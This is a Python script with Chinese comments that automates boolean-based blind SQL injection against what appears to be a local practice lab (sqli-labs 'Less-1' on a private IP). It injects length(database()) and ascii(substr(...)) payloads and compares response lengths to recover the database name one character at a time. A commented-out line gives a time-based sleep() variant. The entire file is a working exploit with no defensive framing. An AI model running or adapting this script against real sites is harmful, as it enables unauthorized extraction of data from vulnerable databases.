# -*- coding: utf-8 -*-
import requests

# 获取数据库长度   这里bool盲注会判断页面返回的正确性。
# 这里采用的方案是取正常页面和报错页面的返回值长度的平均值，以这个值的大小来判断页面是否正常返回
# 比如这里正常返回457，异常返回523，就取490判断是正常还是异常
def get_database_len():
    for xx in range(1,30):
        url = f"http://192.168.3.148/Less-1/?id=1%27%20and%20%20length(database())={xx}%20%20%20--+"
        header = {
            'Connection': 'keep-alive',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'}
        hh = requests.get(url,timeout=30,headers=header)
        # print(hh.headers['Content-Length'])#读取返回值  
        print(int(hh.headers['Content-Length']))# 看返回值，选取适当的判断值
        if int(hh.headers['Content-Length']) > 424:
            print('数据库的长度为：',xx)
            return xx
            break

# 逐个获取数据库的长度
def get_database_str(database_length):
    strs =[]
    for ll in range(1,database_length+1):
        for ss in range(1,128):
            url = f"http://192.168.3.148/Less-1/?id=1%27%20and%20ascii(substr((select%20database()),{ll},1))={ss}%20%20%20--+"
            # url = f"http://192.168.3.148/Less-1/?id=11%27%20and%20%20%20if(ascii(substr(database(),{ll},1))={ss},sleep(3),1)%20%20%20%20--+"
            header = {
                'Connection': 'keep-alive',
                'Cache-Control': 'max-age=0',
                'Upgrade-Insecure-Requests': '1',
                'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                'Accept-Encoding': 'gzip, deflate',
                'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8'}
            hh = requests.get(url,timeout=30,headers=header)
            if int(hh.headers['Content-Length']) > 424:
                print(ll,'字符为：',chr(ss))
                strs.append(chr(ss))
                continue
    print('当前数据库名称为：',''.join(strs))

if __name__ == "__main__":
    ll = get_database_len()
    get_database_str(ll)